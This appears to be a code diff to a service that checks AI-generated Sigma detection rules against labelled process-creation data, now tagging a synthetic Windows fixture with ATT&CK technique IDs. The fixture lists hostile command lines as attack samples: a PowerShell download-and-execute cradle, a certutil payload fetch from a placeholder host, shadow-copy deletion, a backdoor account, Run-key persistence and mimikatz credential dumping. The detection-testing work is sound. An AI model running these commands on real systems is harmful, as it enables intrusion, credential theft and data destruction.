@@ -18,6 +18,7 @@ import pandas as pd
 import yaml
 
 from app.services.ai.ai_client import DEFAULT_MODEL, OLLAMA_URL
+from app.services.ai.harvest_context import expected_product, web_shell_context
 from app.services.detection import sigma_runtime
 
 logger = logging.getLogger("larp.ai.validation")
@@ -30,26 +31,26 @@ MIN_BENIGN = 10
 
 # Legacy Windows fixture, kept for Windows rules and labelled for what it is: synthetic.
 WINDOWS_FIXTURE = [
-    ("explorer.exe", "C:\\Windows\\Explorer.EXE", "userinit.exe", 0),
-    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "services.exe", 0),
-    ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "chrome.exe", 0),
-    ("python.exe", "python.exe C:\\larp\\agent\\win_agent_minimal.py", "cmd.exe", 0),
-    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "taskeng.exe", 0),
-    ("cmd.exe", "cmd.exe /c echo %PATH%", "explorer.exe", 0),
-    ("conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "cmd.exe", 0),
-    ("code.exe", "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "explorer.exe", 0),
-    ("nginx.exe", "nginx -g \"daemon off;\"", "systemd", 0),
-    ("bash", "/bin/bash /usr/local/bin/healthcheck.sh", "cron", 0),
-    ("powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "winword.exe", 1),
-    ("powershell.exe", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.4/rev.ps1')", "excel.exe", 1),
-    ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "cmd.exe", 1),
-    ("wmic.exe", "wmic shadowcopy delete /nointeractive", "cmd.exe", 1),
-    ("certutil.exe", "certutil.exe -urlcache -split -f http://malicious.example/payload.exe payload.exe", "cmd.exe", 1),
-    ("net.exe", "net user backdoor P@ssw0rd123! /add", "powershell.exe", 1),
-    ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "cmd.exe", 1),
-    ("mimikatz.exe", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "cmd.exe", 1),
-    ("rundll32.exe", "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "cmd.exe", 1),
-    ("whoami.exe", "whoami /priv", "cmd.exe", 1),
+    ("explorer.exe", "C:\\Windows\\Explorer.EXE", "userinit.exe", None),
+    ("svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p", "services.exe", None),
+    ("chrome.exe", "\"C:\\Program Files\\Google\\Chrome\\chrome.exe\" --type=renderer", "chrome.exe", None),
+    ("python.exe", "python.exe C:\\larp\\agent\\win_agent_minimal.py", "cmd.exe", None),
+    ("powershell.exe", "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1", "taskeng.exe", None),
+    ("cmd.exe", "cmd.exe /c echo %PATH%", "explorer.exe", None),
+    ("conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "cmd.exe", None),
+    ("code.exe", "\"C:\\Users\\dev\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\"", "explorer.exe", None),
+    ("nginx.exe", "nginx -g \"daemon off;\"", "systemd", None),
+    ("bash", "/bin/bash /usr/local/bin/healthcheck.sh", "cron", None),
+    ("powershell.exe", "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA", "winword.exe", "t1059.001"),
+    ("powershell.exe", "powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.4/rev.ps1')", "excel.exe", "t1059.001"),
+    ("vssadmin.exe", "vssadmin.exe delete shadows /all /quiet", "cmd.exe", "t1490"),
+    ("wmic.exe", "wmic shadowcopy delete /nointeractive", "cmd.exe", "t1490"),
+    ("certutil.exe", "certutil.exe -urlcache -split -f http://malicious.example/payload.exe payload.exe", "cmd.exe", "t1105"),
+    ("net.exe", "net user backdoor P@ssw0rd123! /add", "powershell.exe", "t1136.001"),
+    ("reg.exe", "reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\bad.exe", "cmd.exe", "t1547.001"),
+    ("mimikatz.exe", "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit", "cmd.exe", "t1003.001"),
+    ("rundll32.exe", "rundll32.exe C:\\temp\\malicious.dll,EntryPoint", "cmd.exe", "t1218.011"),
+    ("whoami.exe", "whoami /priv", "cmd.exe", "t1033"),
 ]
 
 
@@ -67,6 +68,8 @@ def _load_jsonl(name: str) -> Tuple[Tuple[dict, ...], str]:
     records = []
     for line in text.splitlines():
         row = json.loads(line)
+        if row["ground_truth_label"] not in ("attack", "benign"):
+            raise ValueError("Unknown ground truth label")
         records.append(_record(row["event_id"], row["source"], row["scenario"],
                                row["ground_truth_label"] == "attack", row["process"], row.get("parent")))
     return tuple(records), hashlib.sha256(text.encode()).hexdigest()[:16]
@@ -74,18 +77,39 @@ def _load_jsonl(name: str) -> Tuple[Tuple[dict, ...], str]:
 
 def labelled_dataset(rule: dict) -> Tuple[List[dict], Dict[str, Any]]:
     """Labelled records for the rule's platform plus a description of where they came from."""
-    product = str((rule.get("logsource") or {}).get("product") or "").lower()
-    records, parts = [], []
-    if product in ("", "linux"):
+    source = rule.get("logsource") or {}
+    product = source.get("product")
+    tags = {str(t).lower() for t in rule.get("tags", [])}
+    meta = {"datasets": [], "product": product, "category": source.get("category")}
+    if source.get("category") != "process_creation":
+        return [], {**meta, "reason": "No labelled dataset for this event category"}
+    if product == "linux":
         linux, digest = _load_jsonl(LINUX_DATASET)
-        records.extend(linux)
-        parts.append({"name": LINUX_DATASET, "sha256": digest})
-    if product in ("", "windows"):
-        records.extend(_record(f"win-fixture-{n:02d}", "synthetic_windows_fixture", "legacy_fixture", label,
-                               {"name": name, "exe": name, "cmdline": cmd}, {"name": parent, "exe": parent})
-                       for n, (name, cmd, parent, label) in enumerate(WINDOWS_FIXTURE, start=1))
-        parts.append({"name": "windows_fixture_v1", "sha256": None})
-    return records, {"datasets": parts, "product": product or "any"}
+        selection = rule["detection"]["selection"]
+        parent_values = [str(value) for key, value in selection.items()
+                         if sigma_runtime.FIELD_ALIASES.get(key.lower().split("|")[0]) in
+                         {"parent_name", "parent_exe", "parent_cmdline"}]
+        web_parent = any(re.search(r"nginx|apache|httpd|flask|gunicorn|uwsgi|php-fpm|web|app\.py", v, re.I)
+                         for v in parent_values)
+        web_shell = ("attack.t1059.004" in tags and web_parent) or web_shell_context(str(rule.get("title", "")))
+        records = [r for r in linux if not r["label"] or (web_shell and
+                   (r["scenario"].startswith("command_injection_") or r["scenario"] == "authorized_attack_emulation"))]
+        meta["datasets"] = [{"name": LINUX_DATASET, "sha256": digest}]
+    elif product == "windows":
+        records = []
+        for n, (name, cmd, parent, technique) in enumerate(WINDOWS_FIXTURE, start=1):
+            if technique and f"attack.{technique}" not in tags:
+                continue
+            scenario = technique or "baseline"
+            label = technique is not None
+            records.append(_record(f"win-fixture-{n:02d}", "synthetic_windows_fixture", scenario, label,
+                                   {"name": name, "exe": name, "cmdline": cmd}, {"name": parent, "exe": parent}))
+        meta["datasets"] = [{"name": "windows_fixture_v1", "sha256": None}]
+    else:
+        return [], {**meta, "reason": "No labelled dataset for this platform"}
+    if not any(r["label"] for r in records):
+        meta["reason"] = "No labelled attack scenario corresponds to the rule target"
+    return records, meta
 
 
 def records_from_dataframe(df: pd.DataFrame, ground_truth: pd.Series) -> List[dict]:
@@ -138,6 +162,7 @@ class ValidationService:
         fpr_threshold: float = 0.05,
         precision_threshold: float = 0.95,
         db_session=None,  # kept for compatibility; validation no longer reads detector-labelled DB rows
+        cti_text: str = "",
     ) -> Dict[str, Any]:
         try:
             rule = yaml.safe_load(rule_yaml)
@@ -145,6 +170,8 @@ class ValidationService:
             return _failure("FAILED", f"YAML syntax error: {e.__class__.__name__}")
         if not isinstance(rule, dict) or not isinstance(rule.get("detection"), dict):
             return _failure("FAILED", "Missing or invalid 'detection' block in Sigma rule")
+        if not isinstance(rule.get("logsource", {}), dict):
+            return _failure("FAILED", "Invalid logsource mapping")
         supported, support_reason = sigma_runtime.check_support(rule)
         if not supported:
             return _failure("UNSUPPORTED_BY_ENGINE", support_reason, engine_supported=False)
@@ -153,8 +180,16 @@ class ValidationService:
             records = records_from_dataframe(historical_logs_df, ground_truth)
             meta = {"datasets": [{"name": "caller_supplied", "sha256": None}], "product": "caller"}
         else:
-            records, meta = labelled_dataset(rule)
+            try:
+                expected = expected_product(cti_text)
+                if expected and (rule.get("logsource") or {}).get("product") != expected:
+                    return _failure("INCONCLUSIVE", f"CTI requires {expected}; regenerate the rule for that platform")
+                records, meta = labelled_dataset(rule)
+            except (OSError, ValueError, KeyError) as exc:
+                return _failure("INCONCLUSIVE", f"Dataset unavailable: {exc}")
         dataset = summarize(records, meta)
+        if meta.get("reason"):
+            return _failure("INCONCLUSIVE", meta["reason"], dataset=dataset)
         if dataset["attack"] < MIN_ATTACK or dataset["benign"] < MIN_BENIGN:
             if historical_logs_df is None:
                 return _failure("INCONCLUSIVE", f"Chưa đủ dữ liệu: cần ít nhất {MIN_ATTACK} mẫu tấn công và "
@@ -183,28 +218,23 @@ class ValidationService:
         recall = tp / attack if attack else None
         f1 = (2 * precision * recall / (precision + recall)) if precision and recall else 0.0
 
-        if tp == 0 and fp == 0:
-            verdict, passed = "INCONCLUSIVE", False
-            reason = ("Không đủ dữ liệu kiểm định: rule không khớp mẫu nào trong tập có nhãn "
-                      f"({attack} mẫu tấn công, {benign} mẫu benign).")
+        # Relevant labelled attacks are present here, so matching nothing is a measured miss (recall 0).
+        passed = tp > 0 and fpr <= fpr_threshold and (precision or 0) >= precision_threshold
+        verdict = "PASSED" if passed else "FAILED"
+        if passed:
+            reason = f"Đạt: FPR {fpr:.2%}, Precision {precision:.2%}, Recall {recall:.2%} trên {len(records)} mẫu có nhãn."
         else:
-            passed = tp > 0 and fpr <= fpr_threshold and (precision or 0) >= precision_threshold
-            verdict = "PASSED" if passed else "FAILED"
-            if passed:
-                reason = f"Đạt: FPR {fpr:.2%}, Precision {precision:.2%}, Recall {recall:.2%} trên {len(records)} mẫu có nhãn."
-            else:
-                reasons = []
-                if tp == 0:
-                    reasons.append("không phát hiện mẫu tấn công nào")
-                if fpr > fpr_threshold:
-                    reasons.append(f"FPR {fpr:.2%} vượt ngưỡng {fpr_threshold:.2%}")
-                if precision is not None and precision < precision_threshold:
-                    reasons.append(f"Precision {precision:.2%} dưới ngưỡng {precision_threshold:.2%}")
-                reason = "Không đạt: " + "; ".join(reasons)
+            reasons = []
+            if tp == 0:
+                reasons.append(f"không phát hiện mẫu nào trong {attack} mẫu tấn công liên quan (Recall 0%)")
+            if fpr > fpr_threshold:
+                reasons.append(f"FPR {fpr:.2%} vượt ngưỡng {fpr_threshold:.2%}")
+            if precision is not None and precision < precision_threshold:
+                reasons.append(f"Precision {precision:.2%} dưới ngưỡng {precision_threshold:.2%}")
+            reason = "Không đạt: " + "; ".join(reasons)
 
         result: Dict[str, Any] = {
             "passed": passed, "verdict": verdict, "reason": reason, "engine_supported": True,
-            # Rates are only reported for a rule that produced at least one alert on the labelled set.
             "fpr": None if verdict == "INCONCLUSIVE" else round(fpr, 4),
             "precision": None if precision is None or verdict == "INCONCLUSIVE" else round(precision, 4),
             "recall": None if recall is None or verdict == "INCONCLUSIVE" else round(recall, 4),
